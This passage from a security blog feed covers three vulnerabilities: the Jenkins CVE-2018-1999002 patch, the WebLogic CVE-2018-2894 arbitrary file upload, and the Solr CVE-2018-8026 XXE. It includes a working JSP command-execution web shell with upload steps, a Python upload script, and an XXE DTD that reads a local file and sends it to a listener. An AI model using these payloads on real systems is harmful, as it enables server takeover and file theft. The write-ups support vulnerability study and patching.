<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>Jenkins官方修改了pom.xml，同时增加一个测试用例文件。真正的补丁在<code>stapler</code>这个web框架中，见commit记录： <a href="https://github.com/stapler/stapler/commit/8e9679b08c36a2f0cf2a81855d5e04e2ed2ac2b3" target="_blank" rel="external">https://github.com/stapler/stapler/commit/8e9679b08c36a2f0cf2a81855d5e04e2ed2ac2b3</a> ：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180726004508-174a70d4-902a-1.png" alt="buding.png"></p>
<p>对从<code>locale</code>取出的<code>language</code>,<code>country</code>,<code>variant</code>均做了正则的校验，只允许字母数字以及特定格式的出现。在接下来的openUrl中，根据三种变量的不同检查情况来调用不同的请求，从而防止了路径穿越漏洞造成的任意文件读取漏洞。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://jenkins.io/security/advisory/2018-07-18/" target="_blank" rel="external">https://jenkins.io/security/advisory/2018-07-18/</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/blob/d71ac6ffe98ee62e0353af7a948a4ae1a69b67e9/test/src/test/java/jenkins/security/stapler/Security914Test.java" target="_blank" rel="external">https://github.com/jenkinsci/jenkins/blob/d71ac6ffe98ee62e0353af7a948a4ae1a69b67e9/test/src/test/java/jenkins/security/stapler/Security914Test.java</a></li>
<li><a href="https://github.com/stapler/stapler/commit/8e9679b08c36a2f0cf2a81855d5e04e2ed2ac2b3" target="_blank" rel="external">https://github.com/stapler/stapler/commit/8e9679b08c36a2f0cf2a81855d5e04e2ed2ac2b3</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2486&quot;&gt;Jenkins 任意文件读取漏洞复现与分析 - 【CVE-2018-1999002】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="Jenkins" scheme="http://chybeta.github.io/tags/Jenkins/"/>
    
      <category term="任意文件读取" scheme="http://chybeta.github.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】</title>
    <link href="http://chybeta.github.io/2018/07/21/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-2894-%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/07/21/WebLogic任意文件上传漏洞复现与分析-【CVE-2018-2894-】/</id>
    <published>2018-07-21T13:15:05.000Z</published>
    <updated>2018-07-21T13:17:14.331Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2458" target="_blank" rel="external">WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】</a><br><a id="more"></a></p>
<h1 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h1><p>漏洞影响版本：10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3</p>
<p>下载地址：<a href="http://download.oracle.com/otn/nt/middleware/12c/12213/fmw_12.2.1.3.0_wls_quick_Disk1_1of1.zip" target="_blank" rel="external">http://download.oracle.com/otn/nt/middleware/12c/12213/fmw_12.2.1.3.0_wls_quick_Disk1_1of1.zip</a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>服务启动后，访问 <a href="http://localhost:7001/ws_utc/config.do" target="_blank" rel="external">http://localhost:7001/ws_utc/config.do</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1cfa6d78-8b3d-1.png" alt="1.jpg"></p>
<p>可以将当前的工作目录为更改为其他目录。以本地环境为例，可以部署到<code>C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls\4mcj4y\war</code>下</p>
<p>选择右边的<code>安全</code>栏目，添加<code>JKS Keystores</code>上传文件。假设<code>chybeta.jsp</code>内容如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;%@ page import="java.util.*,java.io.*,java.net.*"%&gt;</div><div class="line">&lt;HTML&gt;&lt;BODY&gt;</div><div class="line">&lt;FORM METHOD="POST" NAME="myform" ACTION=""&gt;</div><div class="line">&lt;INPUT TYPE="text" NAME="cmd"&gt;</div><div class="line">&lt;INPUT TYPE="submit" VALUE="Send"&gt;</div><div class="line">&lt;/FORM&gt;</div><div class="line">&lt;pre&gt;</div><div class="line">&lt;%</div><div class="line">if (request.getParameter("cmd") != null) &#123;</div><div class="line">        out.println("Command: " + request.getParameter("cmd") + "\n&lt;BR&gt;");</div><div class="line">        Process p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"));</div><div class="line">        OutputStream os = p.getOutputStream();</div><div class="line">        InputStream in = p.getInputStream();</div><div class="line">        DataInputStream dis = new DataInputStream(in);</div><div class="line">        String disr = dis.readLine();</div><div class="line">        while ( disr != null ) &#123;</div><div class="line">                out.println(disr); disr = dis.readLine(); &#125;</div><div class="line">        &#125;</div><div class="line">%&gt;</div><div class="line">&lt;/pre&gt;</div><div class="line">&lt;/BODY&gt;&lt;/HTML&gt;</div></pre></td></tr></table></figure></p>
<p>抓包获取到时间戳为<code>1531987145013</code>，则上传到的位置即<code>config\keystore\1531987145013_chybeta.jsp</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1d2762a6-8b3d-1.png" alt="2.jpg"></p>
<p>访问<code>http://localhost:7001/ws_utc/config/keystore/1531987145013_chybeta.jsp</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1d3c553a-8b3d-1.png" alt="3.jpg"></p>
<h1 id="简要漏洞分析"><a href="#简要漏洞分析" class="headerlink" title="简要漏洞分析"></a>简要漏洞分析</h1><p>在<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/setting/TestClientWorkDirManager.class:59</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">changeWorkDir</span><span class="params">(String path)</span> </span>&#123;</div><div class="line">    String[] oldPaths = <span class="keyword">this</span>.getRelatedPaths();</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.testPageProvider.getWsImplType() == ImplType.JRF) &#123;</div><div class="line">        <span class="keyword">this</span>.isWorkDirChangeable = <span class="keyword">false</span>;</div><div class="line">        <span class="keyword">this</span>.isWorkDirWritable = isDirWritable(path);</div><div class="line">        <span class="keyword">this</span>.isWorkDirChangeable = <span class="keyword">true</span>;</div><div class="line">        <span class="keyword">this</span>.setTestClientWorkDir(path);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">this</span>.persistWorkDir(path);</div><div class="line">        <span class="keyword">this</span>.init();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isWorkDirWritable) &#123;</div><div class="line">        String[] newPaths = <span class="keyword">this</span>.getRelatedPaths();</div><div class="line">        moveDirs(oldPaths, newPaths);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        Logger.fine(<span class="string">"[INFO] Newly specified TestClient Working Dir is readonly. Won't move the configuration stuff to new path."</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>此函数用于改变工作目录，但其中并未做任何检测。</p>
<p>在<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/res/SettingResource.class:181</code>中：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Path</span>(<span class="string">"/keystore"</span>)</div><div class="line"><span class="meta">@POST</span></div><div class="line"><span class="meta">@Produces</span>(&#123;<span class="string">"application/xml"</span>, <span class="string">"application/json"</span>&#125;)</div><div class="line"><span class="meta">@Consumes</span>(&#123;<span class="string">"multipart/form-data"</span>&#125;)</div><div class="line"><span class="function"><span class="keyword">public</span> Response <span class="title">editKeyStoreSettingByMultiPart</span><span class="params">(FormDataMultiPart formPartParams)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!RequestUtil.isRequstedByAdmin(<span class="keyword">this</span>.request)) &#123;</div><div class="line">        <span class="keyword">return</span> Response.status(Status.FORBIDDEN).build();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> (TestClientRT.isVerbose()) &#123;</div><div class="line">            Logger.fine(<span class="string">"calling SettingResource.addKeyStoreSettingByMultiPart"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        String currentTimeValue = <span class="string">""</span> + (<span class="keyword">new</span> Date()).getTime();</div><div class="line">        KeyValuesMap&lt;String, String&gt; formParams = RSDataHelper.getInstance().convertFormDataMultiPart(formPartParams, <span class="keyword">true</span>, TestClientRT.getKeyStorePath(), currentTimeValue);</div><div class="line">        ....</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/core/ws/cdf/config/parameter/TestClientRT.class:31</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getKeyStorePath</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> getConfigDir() + File.separator + <span class="string">"keystore"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>得到要写入的路径<code>storePath</code>。</p>
<p>在<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.class:145</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> KeyValuesMap&lt;String, String&gt; <span class="title">convertFormDataMultiPart</span><span class="params">(FormDataMultiPart formPartParams, <span class="keyword">boolean</span> isExtactAttachment, String path, String fileNamePrefix)</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> (attachName != <span class="keyword">null</span> &amp;&amp; attachName.trim().length() &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (attachName != <span class="keyword">null</span> &amp;&amp; attachName.trim().length() != <span class="number">0</span>) &#123;</div><div class="line">            attachName = <span class="keyword">this</span>.refactorAttachName(attachName);</div><div class="line">            <span class="keyword">if</span> (fileNamePrefix == <span class="keyword">null</span>) &#123;</div><div class="line">                fileNamePrefix = key;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            String filename = (<span class="keyword">new</span> File(storePath, fileNamePrefix + <span class="string">"_"</span> + attachName)).getAbsolutePath();</div><div class="line">            kvMap.addValue(key, filename);</div><div class="line">            <span class="keyword">if</span> (isExtactAttachment) &#123;</div><div class="line">                <span class="keyword">this</span>.saveAttachedFile(filename, (InputStream)bodyPart.getValueAs(InputStream.class));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; </div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>把上传文件的内容传到了<code>storePath</code>目录里，文件名满足<code>fileNamePrefix + &quot;_&quot; + attachName</code>。这过程没有任何过滤和检查：）…</p>
<p>条件：</p>
<ul>
<li>需要知道部署应用的web目录</li>
<li><code>ws_utc/config.do</code>在开发模式下无需认证，在生产模式下需要认证。具体可见<a href="https://docs.oracle.com/middleware/1212/owsm/WSSEC/webservice-test.htm#WSSEC3642" target="_blank" rel="external">Oracle® Fusion Middleware Administering Web Services</a></li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="external">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></li>
<li><a href="https://mp.weixin.qq.com/s/y5JGmM-aNaHcs_6P9a-gRQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/y5JGmM-aNaHcs_6P9a-gRQ</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2458&quot;&gt;WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="文件上传" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="weblogic" scheme="http://chybeta.github.io/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>Apache Solr XXE漏洞分析 -【CVE-2018-8026】</title>
    <link href="http://chybeta.github.io/2018/07/16/Apache-Solr-XXE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-8026%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/07/16/Apache-Solr-XXE漏洞分析-【CVE-2018-8026】/</id>
    <published>2018-07-16T15:13:26.000Z</published>
    <updated>2018-07-16T15:18:40.278Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="external">Apache Solr XXE漏洞分析 -【CVE-2018-8026】</a><br><a id="more"></a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这次的XXE漏洞依赖于SolrCloud API，影响到SolrCloud分布式系统。而SolrCloud需要用到zookeeper。</p>
<h2 id="zookeeper"><a href="#zookeeper" class="headerlink" title="zookeeper"></a>zookeeper</h2><p>在 zookeeper文件夹下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(zookeeper-3.4.12)~ cp .\conf\zoo_sample.cfg .\conf\zoo.cfg、</div></pre></td></tr></table></figure></p>
<p>修改 <code>conf\zoo.cfg</code>中的<code>dataDir</code>和<code>clientPort</code>，以我为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">dataDir= D:\\vuln\\zookeeper-3.4.12\\data</div><div class="line"># the port at which the clients will connect</div><div class="line">clientPort=2181</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>然后启动服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(zookeeper-3.4.12)~ .\bin\zkServer.cmd</div></pre></td></tr></table></figure></p>
<h2 id="solr"><a href="#solr" class="headerlink" title="solr"></a>solr</h2><p>solr受影响版本： 6.6.4, 7.3.1</p>
<p>solr的具体搭建过程不详细说明。通过<code>ant idea</code>等一系列编译可以搭建idea环境。最后启动solr服务时如下，其中<code>-DzkHost=localhost</code>即上面配置zookeeper的<code>clientPort</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">solr start -p 8983 -f -a &quot;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8988 -DzkHost=localhost:2181&quot;</div></pre></td></tr></table></figure></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>附上最简单的脚本evil.py，其中evil.zip见文章附件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">upload_url = <span class="string">"http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=evilconfig"</span></div><div class="line">files = open(<span class="string">"evil.zip"</span>, <span class="string">"rb"</span>)</div><div class="line">print(requests.post(upload_url, data=files).text)</div><div class="line"></div><div class="line">create_url = <span class="string">"http://127.0.0.1:8983/solr/admin/collections?action=CREATE&amp;name=eviltest&amp;numShards=1&amp;collection.configName=evilconfig"</span></div><div class="line">print(requests.get(create_url).text)</div></pre></td></tr></table></figure></p>
<p>还有外部实体xxe.dtd，如下用于读取存放在C盘根目录下的chybeta.txt文件：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM "file:///C:/chybeta.txt"&gt;&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1:8888?%file;/'&gt;"&gt;%int;%send;</div></pre></td></tr></table></figure></p>
<p>如下图，<code>8000</code>服务器用于提供xxe.dtd，<code>8888</code>服务器用于接受xxe传送出来的结果</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173805-f0eca9ac-88db-1.gif" alt="4.gif"></p>
<p>关于XXE的攻击方式等知识不妨参考<a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">小试XML实体注入攻击</a></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="XXE-1"><a href="#XXE-1" class="headerlink" title="XXE 1"></a>XXE 1</h2><p>第一步是需要去上传ConfigSet，根据<a href="https://lucene.apache.org/solr/guide/6_6/configsets-api.html#ConfigSetsAPI-upload" target="_blank" rel="external">Upload a ConfigSet</a>，这一步是将几个xml文件打包成压缩包后上传，其中 schema.xml内容为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">version</span>=<span class="string">"1.1"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"string"</span> <span class="attr">class</span>=<span class="string">"solr.StrField"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"currency"</span> <span class="attr">class</span>=<span class="string">"solr.CurrencyField"</span> <span class="attr">precisionStep</span>=<span class="string">"8"</span> <span class="attr">defaultCurrency</span>=<span class="string">"USD"</span> <span class="attr">currencyConfig</span>=<span class="string">"currency.xml"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">schema</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>currency.xml为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><span class="meta">&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8000/xxe.dtd"&gt;    %remote;    ]&gt;</span></div></pre></td></tr></table></figure></p>
<p>还有一个solrconfig.xml，其内容在此省略。</p>
<p>考虑到是xxe，因此主要来看在何处发生了xml外部实体的解析。当开始第二个请求<code>solr/admin/collections?action=CREATE</code>时，solrcloud将根据指定的<code>collection.configName</code>即上一步上传的evilconfig来进行创建Collections。</p>
<p>org/apache/solr/schema/FileExchangeRateProvider.java:245<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inform</span><span class="params">(ResourceLoader loader)</span> <span class="keyword">throws</span> SolrException </span>&#123;</div><div class="line">  <span class="keyword">if</span>(loader == <span class="keyword">null</span>) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> SolrException(SolrException.ErrorCode.SERVER_ERROR, <span class="string">"Needs ResourceLoader in order to load config file"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">this</span>.loader = loader;</div><div class="line">  reload();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟进<code>reload</code>，到达<br>org/apache/solr/schema/FileExchangeRateProvider.java:159，此时变量如下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173805-f0ff3c0c-88db-1.png" alt="1.jpg"></p>
<p>代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">reload</span><span class="params">()</span> <span class="keyword">throws</span> SolrException </span>&#123;</div><div class="line">  InputStream is = <span class="keyword">null</span>;</div><div class="line">  Map&lt;String, Map&lt;String, Double&gt;&gt; tmpRates = <span class="keyword">new</span> HashMap&lt;&gt;();</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    log.debug(<span class="string">"Reloading exchange rates from file "</span>+<span class="keyword">this</span>.currencyConfigFile);</div><div class="line"></div><div class="line">    is = loader.openResource(currencyConfigFile);</div><div class="line">    javax.xml.parsers.DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      dbf.setXIncludeAware(<span class="keyword">true</span>);</div><div class="line">      dbf.setNamespaceAware(<span class="keyword">true</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (UnsupportedOperationException e) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> SolrException(SolrException.ErrorCode.BAD_REQUEST, <span class="string">"XML parser doesn't support XInclude option"</span>, e);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      Document doc = dbf.newDocumentBuilder().parse(is);</div></pre></td></tr></table></figure></p>
<p><code>currencyConfigFile</code>即前面的currency.xml，<br>通过<code>is = loader.openResource(currencyConfigFile);</code>读取了内容后，在最后把<code>is</code>对象传给了<code>dbf</code>。在<code>dbf.newDocumentBuilder().parse(is);</code>解析了外部实体，造成了xxe。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173805-f1117a20-88db-1.png" alt="2.jpg"></p>
<h2 id="XXE-2"><a href="#XXE-2" class="headerlink" title="XXE 2"></a>XXE 2</h2><p>同样发生在对<code>schema.xml</code>的解析中，我们修改<code>schema.xml</code>的内容如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">"test"</span> <span class="attr">version</span>=<span class="string">"1.1"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"string"</span> <span class="attr">class</span>=<span class="string">"solr.StrField"</span> /&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">fieldType</span> <span class="attr">name</span>=<span class="string">"priorityLevel"</span> <span class="attr">class</span>=<span class="string">"solr.EnumFieldType"</span> <span class="attr">docValues</span>=<span class="string">"true"</span> <span class="attr">enumsConfig</span>=<span class="string">"enumsConfig.xml"</span> <span class="attr">enumName</span>=<span class="string">"priority"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">schema</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>enumsConfig.xml</code>内容为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><span class="meta">&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM "http://127.0.0.1:8000/xxe.dtd"&gt;    %remote;    ]&gt;</span></div></pre></td></tr></table></figure></p>
<p>将<code>schema.xml</code>，<code>enumsConfig.xml</code>和<code>solrconfig.xml</code>打包成zip后，用上面的脚本执行。当solr运行至 org/apache/solr/schema/AbstractEnumField.java:90</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180716173806-f138933a-88db-1.png" alt="3.jpg"></p>
<p>接着在 org/apache/solr/schema/AbstractEnumField.java:110<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">InputStream is = <span class="keyword">null</span>;</div><div class="line">  </div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    is = schema.getResourceLoader().openResource(enumsConfigFile);</div><div class="line">    <span class="keyword">final</span> DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">      <span class="keyword">final</span> Document doc = dbf.newDocumentBuilder().parse(is);</div></pre></td></tr></table></figure></p>
<p>同样由于<code>dbf.newDocumentBuilder().parse(is)</code>造成了外部实体的解析</p>
<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>针对 XXE 1 和 XXE 2 的补丁为 <a href="https://issues.apache.org/jira/secure/attachment/12926593/SOLR-12450.patch" target="_blank" rel="external">SOLR-12450.patch</a></p>
<p>其中增加了<code>solr/core/src/java/org/apache/solr/util/SafeXMLParsing.java</code>，其中定义了多种解析xml的方法。比如<code>parseConfigXML</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">/** Parses a config file from ResourceLoader. Xinclude and external entities are enabled, but cannot escape the resource loader. */</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Document <span class="title">parseConfigXML</span><span class="params">(Logger log, ResourceLoader loader, String file)</span> <span class="keyword">throws</span> SAXException, IOException </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">final</span> DocumentBuilder db = dbf.newDocumentBuilder();</div><div class="line">    db.setEntityResolver(<span class="keyword">new</span> SystemIdResolver(loader));</div><div class="line">    db.setErrorHandler(<span class="keyword">new</span> XMLErrorLogger(log));</div><div class="line">    <span class="keyword">return</span> db.parse(in, SystemIdResolver.createSystemIdFromResourceName(file));</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
